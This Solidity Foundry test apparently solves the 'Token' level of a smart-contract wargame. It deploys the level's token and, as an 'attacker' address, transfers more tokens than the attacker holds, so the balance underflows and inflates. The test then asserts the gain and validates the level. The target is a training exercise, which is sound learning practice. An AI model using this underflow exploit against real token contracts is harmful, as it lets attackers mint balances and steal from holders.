// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {IToken} from "src/hack/interfaces/IToken.sol";
import {Level as TokenFactory} from "src/levels/base/Level.sol";

contract TokenTest is Test {
    uint private constant playerSupply = 20;
    IToken private token;
    TokenFactory private tokenFactory;
    address private attacker = makeAddr("attacker");

    function setUp() external {
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("TokenFactory.sol")
        );
        address tokenFactoryAddress;
        assembly {
            tokenFactoryAddress := create(
                0,
                add(bytecode, 0x20),
                mload(bytecode)
            )
        }
        tokenFactory = TokenFactory(tokenFactoryAddress);
        token = IToken(tokenFactory.createInstance(attacker));
    }

    function test_TokenHack() external {
        vm.startPrank(attacker);
        address toAddress = makeAddr("toAddress");

        // 20 - 21. This will underflow
        token.transfer(toAddress, 21);
        uint256 attackerBalance = token.balanceOf(attacker);
        assertGt(attackerBalance, playerSupply, "Test Failed!");
        tokenFactory.validateInstance(payable(address(token)), attacker);
        console2.log("Balance after hack :", attackerBalance);
        vm.stopPrank();
    }
}
